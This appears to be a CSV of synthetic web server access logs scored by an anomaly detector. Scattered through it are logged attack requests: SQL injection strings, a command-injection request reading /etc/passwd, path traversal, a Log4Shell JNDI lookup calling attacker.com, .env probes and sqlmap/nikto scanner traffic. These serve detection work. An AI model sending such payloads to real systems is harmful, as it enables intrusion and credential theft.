score_content,score_session,score_fused,score_fused_norm,line
0.29128509759902954,,0.29128509759902954,0.29128509759902954,105.31.138.92 - - [10/Jan/2025:12:09:36 +0000] "GET /assets/app.js HTTP/1.1" 200 10390 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9699676036834717,,1.9699676036834717,1.9699676036834717,212.181.179.155 - - [10/Jan/2025:12:09:38 +0000] "GET /contact HTTP/1.1" 200 10068 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11059.775390625,,11059.775390625,11059.775390625,132.13.174.77 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 500 811 "https://www.google.com/" "python-requests/2.31.0"
24.055822372436523,,24.055822372436523,24.055822372436523,64.25.119.27 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=camera HTTP/1.1" 200 18126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.90778160095215,,23.90778160095215,23.90778160095215,96.176.162.241 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13226 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.013503074645996,,2.013503074645996,2.013503074645996,51.232.166.114 - - [10/Jan/2025:12:09:44 +0000] "GET /about HTTP/1.1" 200 2212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24918948113918304,,0.24918948113918304,0.24918948113918304,111.211.186.102 - - [10/Jan/2025:12:09:46 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18905 "-" "nikto/2.5.0"
0.27433761954307556,,0.27433761954307556,0.27433761954307556,71.72.115.227 - - [10/Jan/2025:12:09:49 +0000] "GET /assets/app.js HTTP/1.1" 200 6232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.06468963623047,,24.06468963623047,24.06468963623047,106.226.141.123 - - [10/Jan/2025:12:09:53 +0000] "GET /api/product?id=123 HTTP/1.1" 204 16447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.07672882080078,,24.07672882080078,24.07672882080078,64.162.206.140 - - [10/Jan/2025:12:09:55 +0000] "GET /search?q=phone HTTP/1.1" 200 17329 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.981285095214844,,23.981285095214844,23.981285095214844,129.83.100.70 - - [10/Jan/2025:12:10:00 +0000] "GET /search?q=headphones HTTP/1.1" 200 18635 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.048828125,,30126.048828125,30126.048828125,15.208.254.121 - - [10/Jan/2025:12:10:02 +0000] "GET / HTTP/1.1" 403 575 "https://example.com/" "python-requests/2.31.0"
0.28186866641044617,,0.28186866641044617,0.28186866641044617,69.137.209.203 - - [10/Jan/2025:12:10:06 +0000] "GET /assets/app.js HTTP/1.1" 200 8002 "-" "sqlmap/1.5.10#stable"
24.01215934753418,,24.01215934753418,24.01215934753418,46.61.152.82 - - [10/Jan/2025:12:10:07 +0000] "GET /search?q=laptop HTTP/1.1" 200 5792 "https://example.com/" "sqlmap/1.5.10#stable"
30148.55078125,,30148.55078125,30148.55078125,37.145.243.49 - - [10/Jan/2025:12:10:11 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 1154 "https://twitter.com/" "nikto/2.5.0"
0.3654928207397461,,0.3654928207397461,0.3654928207397461,155.57.6.135 - - [10/Jan/2025:12:10:13 +0000] "GET /index.html HTTP/1.1" 200 7722 "-" "Wget/1.20.3 (linux-gnu)"
4.5621724128723145,,4.5621724128723145,4.5621724128723145,184.46.236.206 - - [10/Jan/2025:12:10:15 +0000] "GET /api/products HTTP/1.1" 304 11265 "-" "curl/7.68.0"
2.9196548461914062,,2.9196548461914062,2.9196548461914062,221.94.246.19 - - [10/Jan/2025:12:10:15 +0000] "GET /../../etc/passwd HTTP/1.1" 304 17345 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.029996871948242,,24.029996871948242,24.029996871948242,188.243.112.203 - - [10/Jan/2025:12:10:19 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5261 "https://example.com/" "nikto/2.5.0"
1.9999728202819824,,1.9999728202819824,1.9999728202819824,209.45.97.79 - - [10/Jan/2025:12:10:20 +0000] "GET /profile HTTP/1.1" 200 19398 "https://example.com/" "sqlmap/1.5.10#stable"
30127.158203125,,30127.158203125,30127.158203125,101.218.198.248 - - [10/Jan/2025:12:10:21 +0000] "GET / HTTP/1.1" 429 1173 "-" "python-requests/2.31.0"
24.020782470703125,,24.020782470703125,24.020782470703125,240.128.37.85 - - [10/Jan/2025:12:10:22 +0000] "GET /api/product?id=123 HTTP/1.1" 201 3511 "-" "sqlmap/1.5.10#stable"
1.8726454973220825,,1.8726454973220825,1.8726454973220825,211.182.172.164 - - [10/Jan/2025:12:10:23 +0000] "GET /dashboard HTTP/1.1" 200 3007 "https://example.com/" "sqlmap/1.5.10#stable"
23.852331161499023,,23.852331161499023,23.852331161499023,90.66.202.28 - - [10/Jan/2025:12:10:26 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11059.9267578125,,11059.9267578125,11059.9267578125,127.226.97.90 - - [10/Jan/2025:12:10:29 +0000] "GET /search?q=phone HTTP/1.1" 500 847 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.01953887939453,,24.01953887939453,24.01953887939453,205.217.9.76 - - [10/Jan/2025:12:10:29 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2515 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0532724857330322,,2.0532724857330322,2.0532724857330322,42.188.20.141 - - [10/Jan/2025:12:10:31 +0000] "GET /about HTTP/1.1" 200 12403 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.582704544067383,,26.582704544067383,26.582704544067383,242.168.43.156 - - [10/Jan/2025:12:10:35 +0000] "GET /search?q=headphones HTTP/1.1" 302 14233 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
11059.7607421875,,11059.7607421875,11059.7607421875,179.142.185.237 - - [10/Jan/2025:12:10:35 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 500 838 "https://example.com/" "python-requests/2.31.0"
0.40136995911598206,,0.40136995911598206,0.40136995911598206,216.126.40.14 - - [10/Jan/2025:12:10:37 +0000] "GET /index.html HTTP/1.1" 200 18111 "-" "curl/7.68.0"
24.21991539001465,,24.21991539001465,24.21991539001465,53.44.164.75 - - [10/Jan/2025:12:10:40 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 943 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.024585723876953,,24.024585723876953,24.024585723876953,24.165.140.100 - - [10/Jan/2025:12:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 8783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.0449275970459,,24.0449275970459,24.0449275970459,120.68.58.215 - - [10/Jan/2025:12:10:43 +0000] "GET /search?q=camera HTTP/1.1" 200 14509 "https://twitter.com/" "curl/7.68.0"
1.9747596979141235,,1.9747596979141235,1.9747596979141235,207.139.106.249 - - [10/Jan/2025:12:10:43 +0000] "GET /contact HTTP/1.1" 200 11365 "https://www.google.com/" "python-requests/2.31.0"
30124.357421875,,30124.357421875,30124.357421875,248.138.176.222 - - [10/Jan/2025:12:10:47 +0000] "GET /.env HTTP/1.1" 400 857 "https://twitter.com/" "nikto/2.5.0"
2.015634298324585,,2.015634298324585,2.015634298324585,129.147.231.133 - - [10/Jan/2025:12:10:48 +0000] "GET /about HTTP/1.1" 200 1237 "https://twitter.com/" "python-requests/2.31.0"
0.20180673897266388,,0.20180673897266388,0.20180673897266388,249.55.207.50 - - [10/Jan/2025:12:10:49 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 5577 "-" "curl/7.68.0"
1.7644622325897217,,1.7644622325897217,1.7644622325897217,214.153.67.82 - - [10/Jan/2025:12:10:52 +0000] "GET /server-status HTTP/1.1" 200 4945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.59375,,30125.59375,30125.59375,118.235.224.4 - - [10/Jan/2025:12:10:55 +0000] "GET /dashboard HTTP/1.1" 401 1064 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.031946182250977,,24.031946182250977,24.031946182250977,38.146.151.150 - - [10/Jan/2025:12:10:59 +0000] "GET /search?q=phone HTTP/1.1" 200 5003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.7890625,,30125.7890625,30125.7890625,225.106.68.99 - - [10/Jan/2025:12:11:03 +0000] "GET /logout HTTP/1.1" 403 704 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.3864400088787079,,0.3864400088787079,0.3864400088787079,37.159.156.175 - - [10/Jan/2025:12:11:07 +0000] "GET /index.html HTTP/1.1" 200 13304 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.479559898376465,,4.479559898376465,4.479559898376465,191.122.236.69 - - [10/Jan/2025:12:11:07 +0000] "GET /dashboard HTTP/1.1" 301 1715 "-" "curl/7.68.0"
2.0273425579071045,,2.0273425579071045,2.0273425579071045,220.179.176.26 - - [10/Jan/2025:12:11:09 +0000] "GET /logout HTTP/1.1" 200 16209 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.685869216918945,,26.685869216918945,26.685869216918945,69.187.107.155 - - [10/Jan/2025:12:11:11 +0000] "GET /search?q=camera HTTP/1.1" 304 10614 "-" "sqlmap/1.5.10#stable"
26.689056396484375,,26.689056396484375,26.689056396484375,223.96.211.15 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=phone HTTP/1.1" 302 17024 "https://www.google.com/" "python-requests/2.31.0"
24.053382873535156,,24.053382873535156,24.053382873535156,226.146.8.45 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 17279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.036222457885742,,24.036222457885742,24.036222457885742,181.51.71.95 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=camera HTTP/1.1" 200 11908 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
4.569692611694336,,4.569692611694336,4.569692611694336,96.126.153.115 - - [10/Jan/2025:12:11:15 +0000] "GET /contact HTTP/1.1" 301 8027 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9641456604003906,,1.9641456604003906,1.9641456604003906,192.213.177.24 - - [10/Jan/2025:12:11:19 +0000] "GET /profile HTTP/1.1" 200 8575 "-" "curl/7.68.0"
30147.255859375,,30147.255859375,30147.255859375,58.174.53.69 - - [10/Jan/2025:12:11:22 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 401 1325 "https://twitter.com/" "dirb/2.22"
2.237725257873535,,2.237725257873535,2.237725257873535,166.45.154.206 - - [10/Jan/2025:12:11:22 +0000] "GET / HTTP/1.1" 200 4435 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.630373001098633,,4.630373001098633,4.630373001098633,109.230.97.219 - - [10/Jan/2025:12:11:24 +0000] "GET /logout HTTP/1.1" 302 9123 "https://news.ycombinator.com/" "curl/7.68.0"
4.624825477600098,,4.624825477600098,4.624825477600098,150.27.2.131 - - [10/Jan/2025:12:11:26 +0000] "GET /logout HTTP/1.1" 301 13113 "https://example.com/" "sqlmap/1.5.10#stable"
1.979676365852356,,1.979676365852356,1.979676365852356,124.17.87.254 - - [10/Jan/2025:12:11:30 +0000] "GET /logout HTTP/1.1" 200 3642 "https://example.com/" "curl/7.68.0"
2.029860734939575,,2.029860734939575,2.029860734939575,196.62.231.15 - - [10/Jan/2025:12:11:32 +0000] "GET /logout HTTP/1.1" 200 17050 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.921147108078003,,2.921147108078003,2.921147108078003,76.67.233.108 - - [10/Jan/2025:12:11:37 +0000] "GET /assets/app.css HTTP/1.1" 302 16397 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
23.872190475463867,,23.872190475463867,23.872190475463867,176.137.164.201 - - [10/Jan/2025:12:11:42 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 7386 "https://example.com/" "nikto/2.5.0"
30124.05078125,,30124.05078125,30124.05078125,47.76.25.121 - - [10/Jan/2025:12:11:46 +0000] "GET /assets/app.js HTTP/1.1" 400 1143 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.30078125,,30125.30078125,30125.30078125,168.23.57.91 - - [10/Jan/2025:12:11:51 +0000] "GET /assets/app.js HTTP/1.1" 429 687 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9315565824508667,,1.9315565824508667,1.9315565824508667,76.119.218.31 - - [10/Jan/2025:12:11:54 +0000] "GET /dashboard HTTP/1.1" 200 19287 "-" "Wget/1.20.3 (linux-gnu)"
2.0301969051361084,,2.0301969051361084,2.0301969051361084,129.31.223.175 - - [10/Jan/2025:12:11:59 +0000] "GET /about HTTP/1.1" 200 6474 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.2513121962547302,,0.2513121962547302,0.2513121962547302,88.105.253.146 - - [10/Jan/2025:12:12:01 +0000] "GET /assets/app.css HTTP/1.1" 200 6663 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.9854791164398193,,2.9854791164398193,2.9854791164398193,86.162.253.46 - - [10/Jan/2025:12:12:03 +0000] "GET /assets/app.js HTTP/1.1" 304 16077 "-" "curl/7.68.0"
4.499574661254883,,4.499574661254883,4.499574661254883,148.196.41.126 - - [10/Jan/2025:12:12:03 +0000] "GET /api/products HTTP/1.1" 302 5624 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.071985244750977,,24.071985244750977,24.071985244750977,99.2.10.137 - - [10/Jan/2025:12:12:07 +0000] "GET /search?q=phone HTTP/1.1" 200 15743 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9088447093963623,,1.9088447093963623,1.9088447093963623,161.188.64.58 - - [10/Jan/2025:12:12:07 +0000] "GET /api/products HTTP/1.1" 200 235 "https://example.com/" "sqlmap/1.5.10#stable"
0.5900933742523193,,0.5900933742523193,0.5900933742523193,43.17.211.12 - - [10/Jan/2025:12:12:09 +0000] "GET /.env HTTP/1.1" 200 10130 "https://example.com/" "python-requests/2.31.0"
1.8785847425460815,,1.8785847425460815,1.8785847425460815,88.231.126.92 - - [10/Jan/2025:12:12:12 +0000] "GET /dashboard HTTP/1.1" 200 4484 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.491172790527344,,26.491172790527344,26.491172790527344,55.188.6.151 - - [10/Jan/2025:12:12:15 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 4399 "-" "curl/7.68.0"
0.3686128854751587,,0.3686128854751587,0.3686128854751587,198.137.160.13 - - [10/Jan/2025:12:12:17 +0000] "GET /index.html HTTP/1.1" 200 8481 "-" "python-requests/2.31.0"
2.0189554691314697,,2.0189554691314697,2.0189554691314697,107.114.98.32 - - [10/Jan/2025:12:12:22 +0000] "GET /admin HTTP/1.1" 200 3894 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.2334718704223633,,2.2334718704223633,2.2334718704223633,170.134.70.160 - - [10/Jan/2025:12:12:27 +0000] "GET / HTTP/1.1" 200 3408 "https://www.google.com/" "python-requests/2.31.0"
1.9444087743759155,,1.9444087743759155,1.9444087743759155,73.30.201.28 - - [10/Jan/2025:12:12:30 +0000] "GET /contact HTTP/1.1" 200 3957 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30125.724609375,,30125.724609375,30125.724609375,92.181.105.76 - - [10/Jan/2025:12:12:34 +0000] "GET /login HTTP/1.1" 400 413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.517019271850586,,4.517019271850586,4.517019271850586,85.61.1.4 - - [10/Jan/2025:12:12:38 +0000] "GET /api/products HTTP/1.1" 301 15850 "-" "sqlmap/1.5.10#stable"
23.924951553344727,,23.924951553344727,23.924951553344727,200.131.20.186 - - [10/Jan/2025:12:12:38 +0000] "GET /search?q=headphones HTTP/1.1" 200 3051 "-" "sqlmap/1.5.10#stable"
11060.0400390625,,11060.0400390625,11060.0400390625,68.119.13.26 - - [10/Jan/2025:12:12:40 +0000] "GET /search?q=camera HTTP/1.1" 502 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8760769367218018,,1.8760769367218018,1.8760769367218018,25.218.195.228 - - [10/Jan/2025:12:12:42 +0000] "GET /dashboard HTTP/1.1" 200 3897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.305417537689209,,0.305417537689209,0.305417537689209,245.160.69.225 - - [10/Jan/2025:12:12:43 +0000] "GET /assets/app.js HTTP/1.1" 200 14443 "-" "sqlmap/1.5.10#stable"
0.30135706067085266,,0.30135706067085266,0.30135706067085266,247.117.70.214 - - [10/Jan/2025:12:12:45 +0000] "GET /assets/app.js HTTP/1.1" 200 13215 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.25842446088790894,,0.25842446088790894,0.25842446088790894,252.242.217.41 - - [10/Jan/2025:12:12:48 +0000] "GET /assets/app.js HTTP/1.1" 200 2021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.038421630859375,,24.038421630859375,24.038421630859375,200.92.157.8 - - [10/Jan/2025:12:12:52 +0000] "GET /search?q=camera HTTP/1.1" 200 12543 "https://www.google.com/" "sqlmap/1.5.10#stable"
30125.7421875,,30125.7421875,30125.7421875,12.17.67.168 - - [10/Jan/2025:12:12:55 +0000] "GET /contact HTTP/1.1" 403 902 "-" "curl/7.68.0"
11059.9287109375,,11059.9287109375,11059.9287109375,224.87.133.134 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 500 1371 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.059131622314453,,24.059131622314453,24.059131622314453,39.215.212.143 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12711 "-" "python-requests/2.31.0"
0.3087039887905121,,0.3087039887905121,0.3087039887905121,219.127.223.43 - - [10/Jan/2025:12:13:00 +0000] "GET /assets/app.js HTTP/1.1" 200 15477 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.034137725830078,,2.034137725830078,2.034137725830078,141.165.97.104 - - [10/Jan/2025:12:13:02 +0000] "GET /login HTTP/1.1" 200 7397 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.050880432128906,,24.050880432128906,24.050880432128906,115.81.31.252 - - [10/Jan/2025:12:13:05 +0000] "GET /search?q=camera HTTP/1.1" 200 16433 "-" "Wget/1.20.3 (linux-gnu)"
0.4412189722061157,,0.4412189722061157,0.4412189722061157,212.24.203.155 - - [10/Jan/2025:12:13:05 +0000] "GET /index.html HTTP/1.1" 200 105 "https://example.com/" "python-requests/2.31.0"
30148.6171875,,30148.6171875,30148.6171875,212.14.210.58 - - [10/Jan/2025:12:13:09 +0000] "GET /search?q=camera HTTP/1.1" 429 744 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
26.575536727905273,,26.575536727905273,26.575536727905273,184.116.30.25 - - [10/Jan/2025:12:13:13 +0000] "GET /search?q=headphones HTTP/1.1" 302 12004 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0148284435272217,,2.0148284435272217,2.0148284435272217,180.28.12.230 - - [10/Jan/2025:12:13:13 +0000] "GET /logout HTTP/1.1" 200 12351 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.038476943969727,,24.038476943969727,24.038476943969727,49.31.239.219 - - [10/Jan/2025:12:13:14 +0000] "GET /search?q=phone HTTP/1.1" 200 6519 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
4.491304874420166,,4.491304874420166,4.491304874420166,194.107.12.238 - - [10/Jan/2025:12:13:17 +0000] "GET /api/products HTTP/1.1" 302 3631 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.059406280517578,,24.059406280517578,24.059406280517578,245.130.35.247 - - [10/Jan/2025:12:13:17 +0000] "GET /search?q=camera HTTP/1.1" 200 19410 "-" "Wget/1.20.3 (linux-gnu)"
30147.392578125,,30147.392578125,30147.392578125,237.131.200.236 - - [10/Jan/2025:12:13:21 +0000] "GET /search?q=phone HTTP/1.1" 400 989 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.29635557532310486,,0.29635557532310486,0.29635557532310486,156.226.83.130 - - [10/Jan/2025:12:13:22 +0000] "GET /assets/app.css HTTP/1.1" 200 19778 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.054319381713867,,24.054319381713867,24.054319381713867,249.76.116.207 - - [10/Jan/2025:12:13:26 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11334 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.65625,,30125.65625,30125.65625,221.81.183.189 - - [10/Jan/2025:12:13:29 +0000] "GET /logout HTTP/1.1" 400 1121 "https://www.google.com/" "python-requests/2.31.0"
4.591206073760986,,4.591206073760986,4.591206073760986,252.182.167.250 - - [10/Jan/2025:12:13:30 +0000] "GET /logout HTTP/1.1" 301 4447 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.53518533706665,,4.53518533706665,4.53518533706665,144.123.150.147 - - [10/Jan/2025:12:13:34 +0000] "GET /dashboard HTTP/1.1" 302 11642 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30125.779296875,,30125.779296875,30125.779296875,207.4.134.28 - - [10/Jan/2025:12:13:39 +0000] "GET /logout HTTP/1.1" 403 865 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2971360981464386,,0.2971360981464386,0.2971360981464386,252.74.175.65 - - [10/Jan/2025:12:13:40 +0000] "GET /wp-login.php HTTP/1.1" 200 5373 "-" "curl/7.68.0"
4.49064826965332,,4.49064826965332,4.49064826965332,92.209.116.27 - - [10/Jan/2025:12:13:45 +0000] "GET /api/products HTTP/1.1" 302 1158 "https://twitter.com/" "python-requests/2.31.0"
24.0274715423584,,24.0274715423584,24.0274715423584,178.171.13.238 - - [10/Jan/2025:12:13:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 9525 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11038.1005859375,,11038.1005859375,11038.1005859375,4.191.65.52 - - [10/Jan/2025:12:13:49 +0000] "GET /dashboard HTTP/1.1" 500 110 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.623197078704834,,4.623197078704834,4.623197078704834,190.155.51.199 - - [10/Jan/2025:12:13:50 +0000] "GET /profile HTTP/1.1" 302 18011 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.027230978012085,,2.027230978012085,2.027230978012085,189.132.31.97 - - [10/Jan/2025:12:13:52 +0000] "GET /about HTTP/1.1" 200 5794 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.25882917642593384,,0.25882917642593384,0.25882917642593384,2.85.120.182 - - [10/Jan/2025:12:13:54 +0000] "GET /assets/app.css HTTP/1.1" 200 8456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.049490213394165,,3.049490213394165,3.049490213394165,126.203.147.141 - - [10/Jan/2025:12:13:55 +0000] "GET /index.html HTTP/1.1" 304 9968 "-" "curl/7.68.0"
30148.63671875,,30148.63671875,30148.63671875,18.202.130.41 - - [10/Jan/2025:12:14:00 +0000] "GET /api/product?id=123 HTTP/1.1" 429 1066 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.9580254554748535,,1.9580254554748535,1.9580254554748535,170.85.85.93 - - [10/Jan/2025:12:14:04 +0000] "GET /profile HTTP/1.1" 200 7091 "https://www.google.com/" "curl/7.68.0"
2.2663803100585938,,2.2663803100585938,2.2663803100585938,115.62.232.165 - - [10/Jan/2025:12:14:08 +0000] "GET / HTTP/1.1" 200 11437 "https://twitter.com/" "python-requests/2.31.0"
1.8757365942001343,,1.8757365942001343,1.8757365942001343,99.66.139.186 - - [10/Jan/2025:12:14:09 +0000] "GET /dashboard HTTP/1.1" 200 3815 "-" "curl/7.68.0"
1.9924496412277222,,1.9924496412277222,1.9924496412277222,115.125.12.76 - - [10/Jan/2025:12:14:13 +0000] "GET /profile HTTP/1.1" 200 16770 "https://www.google.com/" "sqlmap/1.5.10#stable"
